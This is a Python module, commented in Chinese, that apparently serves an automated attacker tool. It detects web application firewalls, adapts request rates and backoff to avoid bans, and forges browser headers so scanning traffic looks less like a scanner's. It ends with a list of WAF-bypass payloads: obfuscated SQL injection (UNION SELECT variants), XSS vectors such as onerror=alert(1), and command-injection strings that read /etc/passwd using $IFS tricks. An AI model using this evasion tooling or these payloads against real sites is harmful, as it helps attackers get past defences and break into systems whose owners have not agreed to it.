"""轻量对抗防护工具：速率自适应 + WAF 检测 + 重试退避。

用户痛点：当前架构默认目标无防护，未设计 WAF 绕过/速率限制应对/IP 封禁规避。
本工具提供轻量级纯 Python 实现（不依赖外部 binary）：

  1) detect_waf(response_text, headers) : 从响应特征识别常见 WAF
     （阿里云盾/Cloudflare/安全狗/360/长亭雷池等）
  2) adaptive_rate(status_history, base_qps) : 根据响应状态自适应调整并发速率
     （连续 429/403 → 降速；正常 → 缓慢恢复）
  3) retry_with_backoff(attempt, base_delay) : 指数退避重试策略
  4) build_stealth_headers(url) : 生成隐蔽请求头（伪造 UA/Referer/降低特征）
"""
import random
import time


# WAF 指纹特征库（响应头/响应体关键词）
WAF_FINGERPRINTS: dict[str, list[str]] = {
    "阿里云盾": ["errors.aliyun.com", "aliyun", "waf.aliyun"],
    "Cloudflare": ["cf-ray", "cloudflare", "__cf_bm"],
    "安全狗": ["safedog", "safedogsite", "WAF/2.0"],
    "360 松鼠云": ["360wzb", "squirrel", "qianxin"],
    "长亭 雷池": ["chaitin", "leis", "waf-chaitin"],
    "腾讯云 WAF": ["Tencent", "waf.tencent-cloud"],
    "F5 ASM": ["F5", "BIG-IP", "ASM"],
    "Imperva": ["incapsula", "visid", "Imperva"],
    "ModSecurity": ["mod_security", "ModSecurity", "NOYB"],
    "Apache Shield": ["apache", "server at"],
    "宝塔 WAF": ["BT-PANEL", "宝塔", "BT WAF"],
    "长亭 云盾": ["yundun", "云盾"],
}


def detect_waf(response_text: str = "", headers: dict | None = None) -> str:
    """从响应特征识别 WAF 类型。

    response_text : 响应体（截断 2000 即可）
    headers       : 响应头 dict
    返回识别到的 WAF 列表字符串。
    """
    headers = headers or {}
    # 把 headers 拼成字符串统一匹配
    header_str = " ".join(f"{k}:{v}" for k, v in headers.items())
    combined = (header_str + "\n" + (response_text or "")).lower()

    detected: list[str] = []
    for waf, fingerprints in WAF_FINGERPRINTS.items():
        for fp in fingerprints:
            if fp.lower() in combined:
                if waf not in detected:
                    detected.append(waf)
                break

    if not detected:
        return ("== detect_waf: 未识别到明显 WAF 特征 "
                "（可能无 WAF 或使用未列出的 WAF）==")
    lines = [f"== detect_waf: 检测到 {len(detected)} 个 WAF 特征 =="]
    for w in detected:
        lines.append(f"  - {w}")
    lines.append("\n建议: 降低速率 + 用 build_stealth_headers 伪装 + "
                 "payload 用 chunked 分块/编码绕过")
    return "\n".join(lines)


def adaptive_rate(status_history: list[int], base_qps: float = 5.0) -> str:
    """根据响应状态历史自适应调整并发速率。

    status_history : 最近 N 次响应的状态码列表
    base_qps       : 基础每秒请求数
    返回建议的 qps + 退避策略字符串。

    策略：
      - 连续 3+ 次 429/403 → 降到 base_qps*0.2，建议指数退避
      - 出现 5xx → 降到 base_qps*0.5（目标可能过载）
      - 正常 200 居多 → 缓慢恢复到 base_qps
    """
    if not status_history:
        return f"adaptive_rate: 无状态历史，保持 base_qps={base_qps}"

    recent = status_history[-10:]  # 最近 10 次
    blocked = sum(1 for s in recent if s in (403, 429))
    server_err = sum(1 for s in recent if 500 <= s < 600)
    ok = sum(1 for s in recent if 200 <= s < 300)

    if blocked >= 3:
        # 被限流/封禁，大幅降速
        new_qps = base_qps * 0.2
        return (f"adaptive_rate: 检测到 {blocked} 次阻断(429/403)，"
                f"建议 qps={new_qps:.2f}（base={base_qps}*0.2）+ "
                f"指数退避 retry_with_backoff。可能被 WAF/IP 黑名单拦截。")
    if server_err >= 3:
        new_qps = base_qps * 0.5
        return (f"adaptive_rate: {server_err} 次 5xx（目标可能过载），"
                f"建议 qps={new_qps:.2f}（base*0.5）")
    if ok >= 7:
        # 正常居多，缓慢恢复（不超过 base）
        new_qps = min(base_qps, base_qps * 0.8 + 0.2 * (ok / 10))
        return (f"adaptive_rate: {ok} 次 2xx，恢复正常，"
                f"建议 qps={new_qps:.2f}")
    return f"adaptive_rate: 状态混合，建议保持 qps={base_qps * 0.7:.2f}"


def retry_with_backoff(attempt: int, base_delay: float = 1.0,
                        max_delay: float = 60.0) -> str:
    """指数退避 + 抖动：返回应等待的秒数。

    attempt : 第几次重试（1-based）
    base_delay : 基础延迟（秒）
    max_delay : 最大延迟上限（秒）
    """
    if attempt < 1:
        attempt = 1
    # 指数退避: base * 2^(attempt-1)
    delay = base_delay * (2 ** (attempt - 1))
    # 加抖动防止同步重试（0-50% 随机）
    jitter = random.uniform(0, delay * 0.5)
    total = min(delay + jitter, max_delay)
    return (f"retry_with_backoff: attempt={attempt}, "
            f"建议等待 {total:.2f}s（base={base_delay}+jitter={jitter:.2f},"
            f" cap={max_delay}）")


def build_stealth_headers(url: str = "", referer: str = "") -> str:
    """生成隐蔽请求头：伪造常见浏览器 UA + Referer + 降低特征。

    给 Attacker 重放变异请求时用，降低被 WAF 识别为扫描器的概率。
    """
    # 轮换 UA 池（覆盖主流浏览器，降低单一 UA 被风控）
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
        "(KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) "
        "Gecko/20100101 Firefox/128.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    ]
    ua = random.choice(user_agents)

    # Referer 同源伪造（降低被识别为外部扫描）
    ref = referer or (url.rstrip("/") + "/" if url else "")

    accept_lang = random.choice([
        "zh-CN,zh;q=0.9,en;q=0.8",
        "en-US,en;q=0.9,zh-CN;q=0.8",
        "zh-CN,zh;q=0.9",
    ])

    lines = ["== build_stealth_headers 隐蔽请求头 =="]
    lines.append(f"User-Agent: {ua}")
    lines.append(f"Referer: {ref}")
    lines.append(f"Accept-Language: {accept_lang}")
    lines.append("Accept: text/html,application/xhtml+xml,application/xml;"
                 "q=0.9,image/webp,*/*;q=0.8")
    lines.append("Connection: keep-alive")
    lines.append("")
    lines.append("提示: 重放变异请求时携带这些头，降低 WAF 识别概率。"
                 "若仍被拦截，建议用 chunked 分块传输/双重 URL 编码绕过。")
    return "\n".join(lines)


def waf_bypass_payload_hints(vuln_type: str = "") -> str:
    """WAF 绕过 payload 提示（针对不同漏洞类型的通用绕过技巧）。

    纯 Python 字典，不调 LLM。
    """
    hints: dict[str, list[str]] = {
        "sqli": [
            "内联注释: /*!50000 UNION*/ /*!50000 SELECT*/",
            "大小写混: UnIoN SeLeCt",
            "双重 URL 编码: %2555nion",
            "chunked 分块传输绕 ModSecurity",
            "HTTP 参数污染: id=1&id=UNION SELECT",
            "用 /**/ 替代空格: UNION/**/SELECT",
        ],
        "xss": [
            "大小写: <ScRiPt>alert(1)</ScRiPt>",
            "编码: <svg/onload=alert(1)>",
            "事件: <img src=x onerror=alert(1)>",
            "双重编码: %253Cscript%253E",
            "JavaScript 伪协议: javascript:alert(1)",
            "Template literals: ${alert(1)}",
        ],
        "cmd_injection": [
            "空格替代: ${IFS} 或 $IFS$9",
            "编码: %2f (替代 /)",
            "通配符: /bin/cat /etc/p?sswd",
            "无引号: cat$IFS/etc/passwd",
            "十六进制: \\x2f\\x65\\x74\\x63",
        ],
    }
    if not vuln_type:
        lines = ["== waf_bypass_payload_hints 全部索引 =="]
        for k, v in hints.items():
            lines.append(f"  {k}: {len(v)} 条绕过技巧")
        lines.append("\n按 vuln_type 查询：waf_bypass_payload_hints('sqli')")
        return "\n".join(lines)
    items = hints.get(vuln_type.lower(), [])
    if not items:
        return f"未内置 {vuln_type} 的绕过提示，可用: {list(hints.keys())}"
    lines = [f"== waf_bypass_payload_hints {vuln_type} =="]
    for i, h in enumerate(items, 1):
        lines.append(f"  {i}. {h}")
    return "\n".join(lines)
